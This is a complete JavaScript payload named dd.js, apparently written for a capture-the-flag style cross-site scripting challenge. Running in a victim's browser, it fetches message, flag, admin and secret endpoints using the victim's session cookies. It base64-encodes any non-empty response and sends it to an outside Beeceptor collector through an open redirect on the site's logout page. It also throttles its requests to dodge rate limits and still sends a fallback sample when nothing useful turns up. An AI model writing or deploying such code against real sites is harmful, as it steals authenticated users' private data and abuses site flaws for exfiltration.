// dd.js - lightweight probe + exfil via logout redirect (committed as dd.js)
(function(){
  const COL = "https://labolabo.free.beeceptor.com"; // your Beeceptor
  function b64(s){
    try { return btoa(unescape(encodeURIComponent(String(s)))); }
    catch(e){ return btoa(String(s)); }
  }
  function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }

  async function probeAndSend() {
    const eps = [
      "/messages?id=9093",
      "/messages?id=9094",
      "/messages?id=1337",
      "/messages?id=1",
      "/messages",
      "/flag",
      "/admin/flag",
      "/admin/messages",
      "/secret"
    ];
    let last = "[no-response]";
    for (let ep of eps) {
      try {
        const r = await fetch(ep, { method:"GET", credentials:"include" });
        const text = await r.text().catch(()=>"[read-error]");
        last = text || last;
        const cleaned = (text || "").trim();
        // quick heuristics for interesting content
        if (cleaned && cleaned !== "{\"messages\":[]}" && !/^HTTP \d+/.test(cleaned)) {
          // send only a safe-length prefix to avoid url truncation
          const payload = b64((text||"").slice(0, 2000));
          location.href = "/logout?next=" + encodeURIComponent(COL + "/" + payload);
          return;
        }
      } catch (e) {
        last = "[exception] " + String(e);
      }
      await sleep(700); // be slow to avoid rate limits
    }
    // nothing interesting — still exfil something small so you know it ran
    const small = b64((last||"").slice(0,500));
    location.href = "/logout?next=" + encodeURIComponent(COL + "/" + small);
  }

  try { probeAndSend(); } catch(e){}
})();
